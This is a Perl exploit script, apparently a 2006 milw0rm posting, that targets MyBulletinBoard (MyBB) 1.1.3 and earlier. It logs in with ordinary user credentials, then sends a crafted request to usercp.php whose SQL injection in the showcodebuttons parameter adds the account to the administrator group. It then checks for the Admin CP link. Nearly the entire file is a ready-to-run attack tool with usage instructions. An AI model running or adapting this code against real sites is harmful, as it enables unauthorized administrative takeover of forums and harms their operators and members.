#!/usr/bin/perl
# MyBulletinBoard (MyBB) <= 1.1.3 Create An Admin Exploit
#
# www.h4ckerz.com / hackerz.ir / aria-security.net / Myimei.com /
# ./2006-6-23
### Coded By Hessam-x / Hessamx-at-Hessamx.net

use IO::Socket; 
use LWP::UserAgent;
use HTTP::Cookies;


 $host = $ARGV[0];
 $uname = $ARGV[1];
 $passwd = $ARGV[2];
 $url = "http://".$host;
 
 print q(
 ###########################################################
 # MyBulletinBoard (MyBB) <= 1.1.3 Create An Admin Exploit #
 #           www.hackerz.ir - www.h4ckerz.com              #
 ################### Coded By Hessam-x #####################

);


 
 if (@ARGV < 3) {
 print " #  usage : hx.pl [host&path] [uname] [pass]\n"; 
 print " #  E.g : hx.pl www.milw0rm.com/mybb/ str0ke 123456\n"; 
  exit();
 }
 
    print " [~] User/Password : $uname/$passwd \n";
    print " [~] Host : $host \n";
    print " [~] Login ... ";


   
$xpl = LWP::UserAgent->new() or die;
$cookie_jar = HTTP::Cookies->new();

$xpl->cookie_jar( $cookie_jar );
 $res = $xpl->post($url.'member.php',
 Content => [
 "action"   => "do_login",
 "username"   => "$uname",
 "password"   => "$passwd",
 "submit"      => "Login",
 ],);
 
 if($cookie_jar->as_string =~ /mybbuser=(.*?);/) { 
  print "successfully .\n";
  } else { 
  print "UNsuccessfully !\n";
  print " [-] Can not Login In $host !\n"; 
  exit(); 
  }
 
$req = $xpl->get($url.'usercp.php?action=do_options&showcodebuttons=1\',additionalgroups=\'4');
$tst = $xpl->get($url.'index.php');
if ($tst->as_string =~ /Admin CP/) { 
print " [+] You Are Admin Now !!";
} else {
    print " [-] Exploit Failed !";
    }

# milw0rm.com [2006-06-25]
